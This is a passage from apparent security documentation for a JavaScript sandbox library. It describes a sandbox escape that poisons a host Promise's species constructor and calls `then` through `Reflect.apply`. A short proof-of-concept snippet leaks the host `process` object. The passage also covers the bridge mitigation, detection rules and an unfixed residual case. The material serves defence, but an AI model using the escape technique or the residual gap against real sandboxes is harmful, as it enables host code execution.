// receiver, so a peel that only recognizes Function.prototype.call/apply never sees
// the promise method and neither the species neutralization nor the callback
// wrapping fires.
new VM({sandbox:{hostReject: () => Promise.reject(process), hostReflect: Reflect}}).run(`
  const p = hostReject();
  p.constructor = { [Symbol.species]: Evil };   // as above
  hostReflect.apply(p.then, p, []);             // also: Reflect.apply(then.call, then, [p])
`);
```

### Why It Works

`SpeciesConstructor` reads `constructor` / `@@species` off the raw host promise before any reaction runs, and the bridge never mediated that read. The slot-wrapping defense only sanitizes *present* callbacks; a missing handler has no slot, and V8's Thrower/Identity fills it with the raw settlement value.

### Mitigation

Neutralize the species channel at the **capability-construction** chokepoint, not the value-delivery one. Across a sandbox→host `then`/`catch`/`finally` call, `lib/bridge.js` (`neutralizeHostPromiseSpeciesOn`) shadows the raw host promise's own `constructor` with an inert `undefined` data property for the duration of the call, so `SpeciesConstructor` resolves to the realm-correct host `%Promise%`; the result capability is a genuine host promise the sandbox can never capture. The raw settlement then flows into a host promise, observable by the sandbox only by attaching a fresh `.then`/`.catch` — which re-enters the trap and *is* sanitized by the Category 38 rebuild. The original `constructor` is restored in the existing `finally` (deleted when there was no own descriptor). The peel (`peelEffectivePromiseCall`) resolves `.call`/`.apply`/`Reflect.apply` indirection and recognizes `.finally`, returning the effective receiver so direct, indirected, and finally shapes are all covered. (`.bind` needs no peel branch: the bridge unwraps a host bound function so the apply trap already sees the target `then`/`catch`/`finally` as `object`.) The peel MUST recognize *every* host callable that can invoke a host promise method with a sandbox-chosen receiver — the neutralization and the callback wrapping both gate on it, so any un-peeled invoker (e.g. host `Reflect.apply`, reachable whenever the embedder exposes host `Reflect`) re-opens both the missing-handler species escape and the callback-slot bypass. Fails closed with `VMError` on a non-configurable `constructor` or a non-extensible host promise (neither can be safely shadowed). Present handlers still route through the Category 38 rebuild unchanged — no over-block. Mirrors `neutralizeArraySpeciesOn` ([Category 18](host-reference-primitives.md#attack-category-18-array-species-self-return-via-constructor-manipulation)) and the sandbox-side `resetPromiseSpecies` ([Category 43](promise-async.md#attack-category-43-stale-promisethenlookupchain-protector--species-survives-finally)). Restores **[Defense Invariant #4](../ATTACKS.md#defense-invariants)** (V8 internal algorithms must see neutralized species on raw objects) and **[#12](../ATTACKS.md#defense-invariants)** for every host-promise method call the sandbox initiates.

### Detection Rules

- Sandbox source assigning `constructor` or a `[Symbol.species]` onto a host-realm object obtained from an embedder API — especially a Promise.
- A host `.then` / `.catch` / `.finally` invoked from the sandbox with the settlement-direction handler omitted after a `constructor` / species write.
- Any defense that sanitizes Promise *callback values* but not the *result-capability constructor*: the missing-handler path has no callback to sanitize.
- Sandbox invoking a host `.then`/`.catch`/`.finally` through an indirection primitive the promise peel does not recognize — `Reflect.apply(p.then, p, [])`, `Reflect.apply(then.call, then, [p])` — after a species write. Any host callable that forwards to another callable with a chosen `this` is an indirection primitive here.

### Known Residual

The neutralization is scoped to the sandbox→host call: the sandbox's `p.constructor = Evil` write itself still lands on the raw host promise (the bridge `set` trap permits ordinary writes onto a non-frozen host object), and it is shadowed only while a sandbox-initiated `then`/`catch`/`finally` is in flight. This becomes a bug when **host-realm code** later calls `.then()` / `.catch()` / `.finally()` (or `Reflect.apply(p.then, p, …)`) on that same poisoned promise with the settlement-direction handler omitted: `SpeciesConstructor` then runs entirely host-side, invokes the sandbox `Evil` executor, and the raw settlement reaches the captured capability. A plain `await p` in host code is unaffected (`await` does not consult `SpeciesConstructor`). Embedder helpers that forward a sandbox-touched promise through their own `.then` are the exposed shape; closing it structurally means refusing `constructor` / `[Symbol.species]` writes on host promises at the `set` / `defineProperty` traps, mirroring the sandbox-side freeze of Category 43.
